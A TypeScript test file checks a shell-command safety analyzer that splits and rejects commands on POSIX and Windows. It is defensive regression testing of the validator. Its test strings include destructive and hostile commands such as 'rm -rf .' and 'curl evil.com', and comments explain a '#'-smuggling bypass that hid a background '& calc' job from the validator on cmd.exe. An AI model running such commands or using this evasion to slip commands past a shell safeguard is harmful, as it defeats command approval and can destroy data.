/**
 * Tests for shell-analyzer.ts — SEC-01 hardening verification.
 * Run: npm --prefix packages/maestroclaw test
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { analyzeShellCommand } from "../src/lib/kernel/shell-analyzer.js";

// ── Semicolon separator ──
// ";" is a real segment separator in POSIX shells, but NOT in cmd.exe — which
// is what approved-shell.ts/pty-shell.ts actually execute through on Windows
// (shell: true). Confirmed empirically: `git status; git status` run through
// cmd.exe is passed through as ONE literal command line ("status;" glued to
// "git" as a single malformed argument), never re-dispatching on ";" at all.
// The original version of this test (like the "#" test before its fix) called
// analyzeShellCommand() with no explicit platform, so it silently asserted
// POSIX semantics only on POSIX runners — pinned explicitly below. See
// docs/audits/MAESTROCLAW-ATTACK-PLAN.md §7 for the fuller writeup.

test("semicolon splits into 2 segments on posix", () => {
  const r = analyzeShellCommand("git status; rm -rf .", "linux");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 2);
  assert.strictEqual(r.segments[0].argv[0], "git");
  assert.strictEqual(r.segments[1].argv[0], "rm");
});

test("SEC regression: semicolon is rejected outright on windows, not silently mis-split", () => {
  const r = analyzeShellCommand("git status; git status", "win32");
  assert.strictEqual(r.ok, false, "cmd.exe does not support ';' as a separator — must not be validated as 2 safe segments");
  assert.ok(r.reason?.includes(";"), `expected reason to mention ';', got: ${r.reason}`);
  assert.ok(r.reason?.toLowerCase().includes("&&"), `expected reason to point at the working alternative, got: ${r.reason}`);
});

test("semicolon inside double quotes does not split", () => {
  const r = analyzeShellCommand('echo "a;b"');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "echo");
});

test("semicolon inside single quotes does not split", () => {
  const r = analyzeShellCommand("echo 'a;b'");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "echo");
});

test("escaped semicolon does not split", () => {
  const r = analyzeShellCommand("echo a\\;b");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "echo");
});

// ── && separator ──

test("&& splits into 2 segments", () => {
  const r = analyzeShellCommand("git status && curl evil.com");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 2);
  assert.strictEqual(r.segments[0].argv[0], "git");
  assert.strictEqual(r.segments[1].argv[0], "curl");
});

test("&& inside double quotes does not split", () => {
  const r = analyzeShellCommand('echo "a&&b"');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "echo");
});

test("&& inside single quotes does not split", () => {
  const r = analyzeShellCommand("echo 'a&&b'");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "echo");
});

// ── || separator ──

test("|| splits into 2 segments", () => {
  const r = analyzeShellCommand("git status || rm -rf .");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 2);
  assert.strictEqual(r.segments[0].argv[0], "git");
  assert.strictEqual(r.segments[1].argv[0], "rm");
});

test("|| inside double quotes does not split", () => {
  const r = analyzeShellCommand('echo "a||b"');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "echo");
});

// ── Single & (background) is always disallowed ──

test("single & at end of command is rejected", () => {
  const r = analyzeShellCommand("git status &");
  assert.strictEqual(r.ok, false);
  assert.ok(r.reason?.includes("&"), `expected reason to mention &, got: ${r.reason}`);
});

test("single & in middle of command is rejected", () => {
  const r = analyzeShellCommand("sleep 10 & echo hi");
  assert.strictEqual(r.ok, false);
});

// ── &&& (separator then lone & ── should fail) ──

test("&&& is rejected (separator then lone &)", () => {
  const r = analyzeShellCommand("git &&&");
  assert.strictEqual(r.ok, false);
});

// ── Pipe (existing behavior preserved) ──

test("pipe splits into 2 segments", () => {
  const r = analyzeShellCommand("cat file.txt | grep foo");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 2);
  assert.strictEqual(r.segments[0].argv[0], "cat");
  assert.strictEqual(r.segments[1].argv[0], "grep");
});

test("pipe inside double quotes does not split", () => {
  const r = analyzeShellCommand('echo "a|b"');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "echo");
});

// ── Windows disallowed tokens ──

test("caret is rejected on windows", () => {
  const r = analyzeShellCommand("echo ^hello", "win32");
  assert.strictEqual(r.ok, false);
});

test("percent is rejected on windows", () => {
  const r = analyzeShellCommand("echo %PATH%", "win32");
  assert.strictEqual(r.ok, false);
});

test("exclamation is rejected on windows", () => {
  const r = analyzeShellCommand("echo !hi!", "win32");
  assert.strictEqual(r.ok, false);
});

test("&& is still a valid separator on windows", () => {
  const r = analyzeShellCommand("git status && npm test", "win32");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 2);
});

// ── Redirect tokens always disallowed ──

test("redirect > is disallowed", () => {
  const r = analyzeShellCommand("echo hi > file.txt");
  assert.strictEqual(r.ok, false);
});

test("redirect < is disallowed", () => {
  const r = analyzeShellCommand("cat < file.txt");
  assert.strictEqual(r.ok, false);
});

test("backtick is disallowed", () => {
  const r = analyzeShellCommand("echo `pwd`");
  assert.strictEqual(r.ok, false);
});

// ── Empty and edge cases ──

test("empty command is rejected", () => {
  const r = analyzeShellCommand("");
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, "empty command");
});

test("whitespace-only command is rejected", () => {
  const r = analyzeShellCommand("   ");
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, "empty command");
});

test("single clean command returns 1 segment with correct argv", () => {
  const r = analyzeShellCommand("git status");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "git");
  assert.strictEqual(r.segments[0].argv[1], "status");
});

test("three-segment command with mixed separators on posix", () => {
  const r = analyzeShellCommand("git status && npm test; echo done", "linux");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 3);
  assert.strictEqual(r.segments[0].argv[0], "git");
  assert.strictEqual(r.segments[1].argv[0], "npm");
  assert.strictEqual(r.segments[2].argv[0], "echo");
});

test("mixed separators with a semicolon are rejected on windows even when && is also present", () => {
  const r = analyzeShellCommand("git status && npm test; echo done", "win32");
  assert.strictEqual(r.ok, false);
});

test("three-segment command with windows-safe separators (&&, |) works on windows", () => {
  const r = analyzeShellCommand("git status && npm test | grep foo", "win32");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 3);
  assert.strictEqual(r.segments[0].argv[0], "git");
  assert.strictEqual(r.segments[1].argv[0], "npm");
  assert.strictEqual(r.segments[2].argv[0], "grep");
});

// "#" is a comment-start on POSIX shells but NOT in cmd.exe, which is what
// approved-shell.ts/pty-shell.ts actually execute through on Windows
// (shell: true). Pinned to explicit platforms below — see
// docs/audits/MAESTROCLAW-ATTACK-PLAN.md §2 item 6 / §3 item 3 for the bug
// this closes. The prior version of this test called analyzeShellCommand()
// with no platform argument (defaulting to process.platform), so it silently
// asserted POSIX comment semantics only on POSIX CI runners and would have
// exercised entirely different code on a Windows runner without anyone
// noticing — exactly the kind of drift that let the underlying bug ship.

test("shell comment terminates parsing on posix", () => {
  const r = analyzeShellCommand("git status # this is a comment", "linux");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  assert.strictEqual(r.segments[0].argv[0], "git");
  assert.deepStrictEqual(r.segments[0].argv, ["git", "status"], "everything after # must be dropped on posix");
});

test("shell comment does NOT terminate parsing on windows (cmd.exe has no # comment syntax)", () => {
  const r = analyzeShellCommand("git status # this is a comment", "win32");
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.segments.length, 1);
  // "#" and everything after it must survive as literal argv tokens, matching
  // what cmd.exe will actually do with them — NOT be silently dropped.
  assert.deepStrictEqual(r.segments[0].argv, ["git", "status", "#", "this", "is", "a", "comment"]);
});

test("SEC regression: '#'-smuggled background job is rejected on windows, not silently truncated", () => {
  // This is the exact bypass Sol's parallel audit reported: the analyzer used
  // to treat "#" as a comment on every platform and stop parsing there,
  // producing a "safe" one-segment result — while cmd.exe (the real
  // interpreter on Windows) does not treat "#" as a comment at all and goes
  // on to execute the "& calc" background job. After the fix, parsing
  // continues past "#" on Windows and the trailing "&" is correctly caught.
  const r = analyzeShellCommand("git status # & calc", "win32");
  assert.strictEqual(r.ok, false, "must be rejected, not accepted as a safe 1-segment 'git status'");
  assert.ok(r.reason?.includes("&"), `expected reason to mention &, got: ${r.reason}`);
});
